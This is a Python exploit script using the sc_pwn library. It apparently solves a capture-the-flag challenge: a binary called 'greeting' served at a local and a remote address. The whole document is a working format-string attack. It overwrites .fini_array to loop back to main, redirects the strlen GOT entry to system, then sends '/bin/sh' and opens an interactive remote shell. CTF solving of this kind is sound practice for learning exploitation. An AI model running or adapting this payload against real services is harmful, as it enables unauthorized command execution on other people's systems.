#!/usr/bin/env python
# https://github.com/shift-crops/sc_pwn/blob/master/sc_pwn.py
from sc_pwn import *

env = Environment('local', 'remote')
env.set_item('target',  local   = {'host':'192.168.75.133','port':8080}, \
                        remote  = {'host':'10.71.1.5','port':16317})
env.select()

binf = ELF('greeting')

addr_plt_system         = binf.plt('system') 
addr_bin_main           = binf.function('main')

addr_fini_array         = binf.section('.fini_array')
addr_got_strlen         = binf.got('strlen')

#==========
def attack(cmn):
    fsb = FSB(count=18,gap=2 ,size=2)
    fsb.set_adrval(addr_fini_array, addr_bin_main)
    fsb.set_adrval(addr_got_strlen, addr_plt_system)
    fsb.auto_write(index=12)

    cmn.read_until('name... ')
    cmn.sendln(fsb.get())

    cmn.read_until('name... ')
    cmn.sendln('/bin/sh\0')

#==========

if __name__=='__main__':
    cmn = Communicate(env.target,mode='SOCKET')
    attack(cmn)

    sh = Shell(cmn)
    sh.select()
    del(sh)

    del(cmn)
    
#==========
